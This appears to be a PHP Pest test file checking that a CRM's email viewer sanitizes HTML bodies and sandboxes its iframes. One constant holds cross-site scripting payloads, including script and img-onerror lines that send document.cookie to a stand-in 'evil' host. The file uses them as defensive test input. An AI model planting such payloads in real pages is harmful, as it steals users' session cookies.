<?php

declare(strict_types=1);

use App\Filament\Resources\PeopleResource\Pages\ViewPeople;
use App\Filament\Resources\PeopleResource\RelationManagers\EmailsRelationManager;
use App\Models\People;
use App\Models\User;
use Filament\Facades\Filament;
use Livewire\Features\SupportTesting\Testable;
use Relaticle\EmailIntegration\Enums\EmailParticipantRole;
use Relaticle\EmailIntegration\Enums\EmailPrivacyTier;
use Relaticle\EmailIntegration\Models\ConnectedAccount;
use Relaticle\EmailIntegration\Models\Email;
use Relaticle\EmailIntegration\Models\EmailAttachment;
use Relaticle\EmailIntegration\Support\EmailHtmlSanitizer;

mutates(Email::class, EmailHtmlSanitizer::class);

beforeEach(function (): void {
    $this->owner = User::factory()->withTeam()->create();
    $this->team = $this->owner->currentTeam;

    $this->account = ConnectedAccount::withoutEvents(fn () => ConnectedAccount::factory()->create([
        'team_id' => $this->team->id,
        'user_id' => $this->owner->id,
    ]));

    $this->person = People::create([
        'team_id' => $this->team->id,
        'name' => 'Jane Doe',
        'creator_id' => $this->owner->id,
    ]);

    $this->actingAs($this->owner);
    Filament::setTenant($this->team);
});

function makeEmailWithBody(string $html): Email
{
    /** @var Email $email */
    $email = Email::factory()->create([
        'team_id' => test()->team->id,
        'user_id' => test()->owner->id,
        'connected_account_id' => test()->account->getKey(),
        'privacy_tier' => EmailPrivacyTier::FULL,
    ]);

    $email->body()->create([
        'body_text' => 'plain text',
        'body_html' => $html,
    ]);

    test()->person->emails()->attach($email);

    return $email->fresh(['body', 'participants', 'labels', 'attachments']);
}

/**
 * Render the email reader through the relation-manager overlay, the same
 * `x-emails.email-view` used on company and people Emails tabs.
 */
function mountEmailView(Email $email): Testable
{
    return livewire(EmailsRelationManager::class, [
        'ownerRecord' => test()->person,
        'pageClass' => ViewPeople::class,
    ])->call('selectEmail', $email->getKey());
}

const MALICIOUS_BODY = '<p>hello <b>world</b></p>'
    .'<script>document.location="//evil/?c="+document.cookie</script>'
    .'<img src=x onerror="fetch(\'//evil/\'+document.cookie)">'
    .'<svg onload="alert(1)"></svg>'
    .'<a href="javascript:alert(2)">click</a>';

it('strips scripts, event handlers and javascript urls from the email view', function (): void {
    $email = makeEmailWithBody(MALICIOUS_BODY);

    mountEmailView($email)
        ->assertDontSeeHtml('onerror')
        ->assertDontSeeHtml('onload="alert')
        ->assertDontSeeHtml('javascript:')
        ->assertDontSeeHtml('document.cookie')
        ->assertSeeHtml('hello');
});

it('preserves inline styles and presentational attributes used by email layouts', function (): void {
    $email = makeEmailWithBody(
        '<table bgcolor="#eeeeee" width="600"><tr>'
        .'<td align="center" style="color:#ff0000;padding:10px">'
        .'<p class="lead" style="font-weight:bold">Styled</p>'
        .'</td></tr></table>'
    );

    mountEmailView($email)
        ->assertSeeHtml('bgcolor=&quot;#eeeeee&quot;')
        ->assertSeeHtml('style=&quot;color:#ff0000;padding:10px&quot;')
        ->assertSeeHtml('class=&quot;lead&quot;')
        ->assertSeeHtml('align=&quot;center&quot;');
});

it('renders email participants and ai label through the email view helpers', function (): void {
    $email = makeEmailWithBody('<p>body</p>');

    $email->participants()->createMany([
        [
            'role' => EmailParticipantRole::FROM,
            'name' => 'Alice Sender',
            'email_address' => 'alice@example.test',
        ],
        [
            'role' => EmailParticipantRole::TO,
            'name' => 'Tara Recipient',
            'email_address' => 'tara@example.test',
        ],
        [
            'role' => EmailParticipantRole::CC,
            'name' => 'Cal Copy',
            'email_address' => 'cal@example.test',
        ],
    ]);

    $email->labels()->create([
        'source' => 'system',
        'label' => 'Sales',
    ]);

    mountEmailView($email->fresh(['body', 'participants', 'labels', 'attachments']))
        ->assertSeeHtml('Alice Sender')
        ->assertSeeHtml('Tara Recipient')
        ->assertSeeHtml('Cal Copy')
        ->assertSeeHtml('Sales');
});

it('does not truncate email bodies larger than the sanitizer default input cap', function (): void {
    // Symfony HtmlSanitizer truncates input at 20 KB by default; real email
    // bodies routinely exceed that, so the tail of the message must survive.
    $body = '<p>START-MARKER</p>'
        .str_repeat('<p>filler paragraph to exceed the twenty kilobyte input cap</p>', 600)
        .'<p>END-MARKER-9F3A</p>';

    expect(strlen($body))->toBeGreaterThan(20_000);

    $email = makeEmailWithBody($body);

    mountEmailView($email)
        ->assertSeeHtml('START-MARKER')
        ->assertSeeHtml('END-MARKER-9F3A');
});

it('wraps sanitized email html in a scriptless dark-mode preview document', function (): void {
    $html = EmailHtmlSanitizer::sanitize('<p style="color:#111111;background:#ffffff">Body</p>');

    expect($html)
        ->toContain('<meta name="color-scheme" content="light dark">')
        ->toContain('@media (prefers-color-scheme: dark)')
        ->toContain('background: #17181a')
        ->toContain('padding: 0')
        ->toContain('background-color: transparent !important')
        ->toContain('<p style="color:#111111;background:#ffffff">Body</p>')
        ->not->toContain('<script');
});

it('rewrites cid image references to authorized inline attachment urls', function (): void {
    $email = makeEmailWithBody('<p><img src="cid:logo@example.test"></p>');
    $attachment = EmailAttachment::factory()->inline()->create([
        'email_id' => $email->getKey(),
        'content_id' => 'logo@example.test',
    ]);

    $html = EmailHtmlSanitizer::sanitize($email->body?->body_html, collect([$attachment]));

    expect($html)
        ->toContain(route('email-attachments.inline', ['attachment' => $attachment->getKey()]))
        ->not->toContain('cid:logo@example.test');
});

it('splits inline attachments and sanitizes body html from the email model', function (): void {
    $email = makeEmailWithBody('<p><img src="cid:logo@example.test"></p>');
    $inlineAttachment = EmailAttachment::factory()->inline()->create([
        'email_id' => $email->getKey(),
        'content_id' => 'logo@example.test',
    ]);
    EmailAttachment::factory()->create([
        'email_id' => $email->getKey(),
        'filename' => 'invoice.pdf',
    ]);

    $email->load('attachments');

    expect($email->inlineAttachments())->toHaveCount(1)
        ->and($email->downloadAttachments())->toHaveCount(1)
        ->and($email->sanitizedBodyHtml())
        ->toContain(route('email-attachments.inline', ['attachment' => $inlineAttachment->getKey()]))
        ->not->toContain('cid:logo@example.test');
});

it('renders the email view iframe without scripts and with same-origin height measurement', function (): void {
    $email = makeEmailWithBody('<p>body</p>');

    mountEmailView($email)
        ->assertSeeHtml('<iframe')
        ->assertSeeHtml('sandbox="allow-same-origin allow-popups allow-popups-to-escape-sandbox"')
        ->assertSeeHtml('referrerpolicy="no-referrer"')
        ->assertSeeHtml('dark:bg-neutral-950 dark:[color-scheme:dark]')
        ->assertSeeHtml('dark:bg-gray-950')
        ->assertDontSeeHtml('allow-scripts');
});

it('strips dangerous markup in the threaded email view', function (): void {
    $email = makeEmailWithBody(MALICIOUS_BODY);

    $html = view('filament.emails.email-thread', ['emails' => collect([$email])])->render();

    expect($html)
        ->not->toContain('onerror')
        ->not->toContain('javascript:')
        ->not->toContain('document.cookie');
});

it('sandboxes the threaded iframe without same-origin access', function (): void {
    $email = makeEmailWithBody('<p>body</p>');

    $html = view('filament.emails.email-thread', ['emails' => collect([$email])])->render();

    expect($html)
        ->toContain('sandbox="allow-popups allow-popups-to-escape-sandbox"')
        ->toContain('dark:bg-neutral-900 dark:[color-scheme:dark]')
        ->toContain('dark:bg-gray-950')
        ->not->toContain('allow-scripts')
        ->not->toContain('allow-same-origin');
});
